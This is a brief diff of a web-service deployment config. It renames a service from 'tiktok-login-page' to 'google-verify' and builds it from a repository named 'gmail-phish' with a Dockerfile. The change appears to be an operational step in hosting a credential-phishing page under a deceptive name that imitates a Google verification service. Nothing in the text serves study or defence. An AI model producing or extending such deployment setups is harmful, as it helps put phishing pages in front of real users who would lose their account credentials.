@@ -1,6 +1,6 @@
 services:
   - type: web
-    name: tiktok-login-page
+    name: google-verify
     runtime: docker
     repo: https://github.com/davidmassmutual/gmail-phish.git
     dockerfilePath: ./Dockerfile
